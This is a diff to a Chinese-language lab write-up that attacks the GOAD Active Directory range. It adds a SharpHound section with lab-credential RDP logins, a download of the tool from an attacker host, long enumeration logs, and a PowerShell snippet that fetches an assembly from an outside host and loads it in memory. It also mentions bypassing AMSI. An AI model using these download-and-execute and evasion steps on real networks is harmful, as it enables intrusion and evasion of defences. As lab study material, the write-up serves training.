@@ -10,7 +10,7 @@ impacket-GetADUsers -all north.sevenkingdoms.local/brandon.stark:iseedeadpeople
 ```
 
 ```bash
-mpacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
 [*] Querying north.sevenkingdoms.local for information about domain.
 Name                  Email                           PasswordLastSet      LastLogon           
@@ -19,7 +19,7 @@ Administrator                                         2023-05-31 01:24:31.039750
 Guest                                                 <never>              <never>             
 vagrant                                               2021-05-12 07:38:55.922520  2023-05-31 06:22:46.154533 
 krbtgt                                                2023-05-31 02:09:14.783719  <never>             
-                                                      2023-05-31 02:19:15.062141  <never>             
+2023-05-31 02:19:15.062141  <never>             
 arya.stark                                            2023-05-31 05:43:29.046383  2023-06-02 05:09:00.415651 
 eddard.stark                                          2023-05-31 05:43:35.293315  2023-06-05 09:52:09.638037 
 catelyn.stark                                         2023-05-31 05:43:41.067220  <never>             
@@ -690,8 +690,126 @@ MATCH p=(u:User)-[r1]->(n) WHERE r1.isacl=true and not tolower(u.name) contains 
 
 [BloodHound](https://en.hackndo.com/bloodhound/)
 
-### SharpBloud[待补充]
+### SharpHound
 
+截止到目前获取的用户都不是管理员或Remote Management Users组成员，所以无法通过evil-winrm远程登录运行SharpHound.exe
+
+由于开启了RDP协议，也可以通过RDP进行远程桌面登陆，下图是所有可以登陆north域用户
+
+![BloodHound6](images/BloodHound6.png)
+
+```bash
+xfreerdp /u:hodor /p:hodor /d:north /v:192.168.56.22 /cert-ignore
+```
+但靶场设计者却提供了如下指令，jon.snow是域用户并且是mssql_admin
+```bash
+xfreerdp /u:jon.snow /p:iknownothing /d:north /v:192.168.56.22 /cert-ignore
+```
+* C:\vagrant 文件夹会自动安装在虚拟机上，这将简化文件传输
+* 我们将启动 Sharphound 来检索域名信息
+
+```powershell
+.\SharpHound.exe -d north.sevenkingdoms.local -c all --zipfilename bh_north_sevenkingdoms.zip
+.\SharpHound.exe -d sevenkingdoms.local -c all --zipfilename bh_sevenkingdoms.zip
+.\SharpHound.exe -d essos.local -c all --zipfilename bh_essos.zip
+```
+<details>
+<summary>展开查看</summary>
+<pre><code class="powershell">
+PS C:\Users\jon.snow\Desktop> wget http://192.168.56.106:7777/SharpHound.exe -O SharpHound.exe
+PS C:\Users\jon.snow\Desktop> .\sharphound.exe -d north.sevenkingdoms.local -c all --zipfilename bh_north_sevenkingdoms.zip
+2023-08-02T06:58:25.1829292-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
+2023-08-02T06:58:25.3011496-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
+2023-08-02T06:58:25.3184132-07:00|INFORMATION|Initializing SharpHound at 6:58 AM on 8/2/2023
+2023-08-02T06:58:25.4042214-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for north.sevenkingdoms.local : winterfell.north.sevenkingdoms.local
+2023-08-02T06:58:25.4215476-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
+2023-08-02T06:58:25.5327125-07:00|INFORMATION|Beginning LDAP search for north.sevenkingdoms.local
+2023-08-02T06:58:25.5593607-07:00|INFORMATION|Producer has finished, closing LDAP channel
+2023-08-02T06:58:25.5593607-07:00|INFORMATION|LDAP channel closed, waiting for consumers
+2023-08-02T06:59:02.3941009-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 36 MB RAM
+2023-08-02T06:59:18.4692446-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for sevenkingdoms.local : kingslanding.sevenkingdoms.local
+2023-08-02T06:59:18.4863873-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for sevenkingdoms.local : kingslanding.sevenkingdoms.local
+2023-08-02T06:59:18.6563115-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for sevenkingdoms.local : kingslanding.sevenkingdoms.local
+2023-08-02T06:59:19.0368159-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for sevenkingdoms.local : kingslanding.sevenkingdoms.local
+2023-08-02T06:59:36.1701111-07:00|INFORMATION|Status: 89 objects finished (+89 1.483333)/s -- Using 50 MB RAM
+2023-08-02T07:00:12.5841614-07:00|INFORMATION|Status: 89 objects finished (+89 0.978022)/s -- Using 48 MB RAM
+2023-08-02T07:00:51.6253747-07:00|INFORMATION|Status: 89 objects finished (+89 0.7295082)/s -- Using 48 MB RAM
+2023-08-02T07:01:34.3707568-07:00|INFORMATION|Status: 89 objects finished (+89 0.5816994)/s -- Using 48 MB RAM
+2023-08-02T07:02:02.2289574-07:00|INFORMATION|Status: 89 objects finished (+89 0.4836957)/s -- Using 48 MB RAM
+2023-08-02T07:02:13.6985882-07:00|INFORMATION|Consumers finished, closing output channel
+Closing writers
+2023-08-02T07:02:13.7115517-07:00|INFORMATION|Output channel closed, waiting for output task to complete
+2023-08-02T07:02:13.7529711-07:00|INFORMATION|Status: 107 objects finished (+18 0.5376884)/s -- Using 47 MB RAM
+2023-08-02T07:02:13.7529711-07:00|INFORMATION|Enumeration finished in 00:03:19.1495036
+2023-08-02T07:02:13.7833948-07:00|INFORMATION|Saving cache with stats: 71 ID to type mappings.
+ 78 name to SID mappings.
+ 1 machine sid mappings.
+ 5 sid to domain mappings.
+ 0 global catalog mappings.
+2023-08-02T07:02:13.7989696-07:00|INFORMATION|SharpHound Enumeration Completed at 7:02 AM on 8/2/2023! Happy Graphing!
+PS C:\Users\jon.snow\Desktop> .\sharphound.exe -d sevenkingdoms.local -c all --zipfilename bh_sevenkingdoms.zip
+2023-08-02T07:02:30.1667879-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
+2023-08-02T07:02:30.2641272-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
+2023-08-02T07:02:30.2775069-07:00|INFORMATION|Initializing SharpHound at 7:02 AM on 8/2/2023
+2023-08-02T07:02:30.3379803-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for sevenkingdoms.local : kingslanding.sevenkingdoms.local
+2023-08-02T07:02:30.5915853-07:00|INFORMATION|Loaded cache with stats: 71 ID to type mappings.
+ 78 name to SID mappings.
+ 1 machine sid mappings.
+ 5 sid to domain mappings.
+ 0 global catalog mappings.
+2023-08-02T07:02:30.5915853-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
+2023-08-02T07:02:30.7444146-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for north.sevenkingdoms.local : winterfell.north.sevenkingdoms.local
+2023-08-02T07:02:30.8073203-07:00|INFORMATION|Beginning LDAP search for sevenkingdoms.local
+2023-08-02T07:02:30.8379644-07:00|INFORMATION|Producer has finished, closing LDAP channel
+2023-08-02T07:02:30.8379644-07:00|INFORMATION|LDAP channel closed, waiting for consumers
+2023-08-02T07:03:07.5507123-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 40 MB RAM
+2023-08-02T07:03:23.7421235-07:00|INFORMATION|Consumers finished, closing output channel
+Closing writers
+2023-08-02T07:03:36.3583297-07:00|INFORMATION|Output channel closed, waiting for output task to complete
+2023-08-02T07:03:36.4030055-07:00|INFORMATION|Status: 118 objects finished (+12 2.107143)/s -- Using 49 MB RAM
+2023-08-02T07:03:36.4030055-07:00|INFORMATION|Enumeration finished in 00:00:56.5806468
+2023-08-02T07:03:36.4650025-07:00|INFORMATION|Saving cache with stats: 148 ID to type mappings.
+ 156 name to SID mappings.
+ 1 machine sid mappings.
+ 5 sid to domain mappings.
+ 0 global catalog mappings.
+2023-08-02T07:03:36.4650025-07:00|INFORMATION|SharpHound Enumeration Completed at 7:03 AM on 8/2/2023! Happy Graphing!
+PS C:\Users\jon.snow\Desktop> .\sharphound.exe -d essos.local -c all --zipfilename bh_essos.zip
+2023-08-02T07:03:56.0347690-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
+2023-08-02T07:03:56.1132268-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
+2023-08-02T07:03:56.1225924-07:00|INFORMATION|Initializing SharpHound at 7:03 AM on 8/2/2023
+2023-08-02T07:03:56.4014976-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for essos.local : meereen.essos.local
+2023-08-02T07:03:56.5260333-07:00|INFORMATION|Loaded cache with stats: 148 ID to type mappings.
+ 156 name to SID mappings.
+ 1 machine sid mappings.
+ 5 sid to domain mappings.
+ 0 global catalog mappings.
+2023-08-02T07:03:56.5274883-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
+2023-08-02T07:03:56.5655748-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for north.sevenkingdoms.local : winterfell.north.sevenkingdoms.local
+2023-08-02T07:03:56.6160751-07:00|INFORMATION|Beginning LDAP search for essos.local
+2023-08-02T07:03:56.6292038-07:00|INFORMATION|Producer has finished, closing LDAP channel
+2023-08-02T07:03:56.6292038-07:00|INFORMATION|LDAP channel closed, waiting for consumers
+2023-08-02T07:04:25.1777694-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 41 MB RAM
+2023-08-02T07:04:39.2587271-07:00|INFORMATION|Consumers finished, closing output channel
+Closing writers
+2023-08-02T07:04:39.2745592-07:00|INFORMATION|Output channel closed, waiting for output task to complete
+2023-08-02T07:04:39.3213319-07:00|INFORMATION|Status: 106 objects finished (+106 2.465116)/s -- Using 50 MB RAM
+2023-08-02T07:04:39.3213319-07:00|INFORMATION|Enumeration finished in 00:00:43.4800185
+2023-08-02T07:04:39.3685494-07:00|INFORMATION|Saving cache with stats: 212 ID to type mappings.
+ 225 name to SID mappings.
+ 1 machine sid mappings.
+ 7 sid to domain mappings.
+ 0 global catalog mappings.
+2023-08-02T07:04:39.3685494-07:00|INFORMATION|SharpHound Enumeration Completed at 7:04 AM on 8/2/2023! Happy Graphing!
+</code></pre>
+</details>
+如果想在内存中加载，可以使用powershell反射（如果您在启用 Defender 的情况下执行此操作，您将首先必须绕过 amsi）
+
+```powershell
+$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.56.1/SharpHound.exe')
+$assem = [System.Reflection.Assembly]::Load($data)
+[Sharphound.Program]::Main("-d north.sevenkingdoms.local -c all".Split())
+```
 ### AutoBloody[待补充]
 
 ### RustHound
@@ -704,4 +822,3 @@ rusthound -d north.sevenkingdoms.local -u 'brandon.stark' -p 'iseedeadpeople' -o
 ```bash
 bloodhound-python --zip -c All -d north.sevenkingdoms.local -u brandon.stark -p iseedeadpeople -dc winterfell.north.sevenkingdoms.local -ns 192.168.56.11
 ```
-
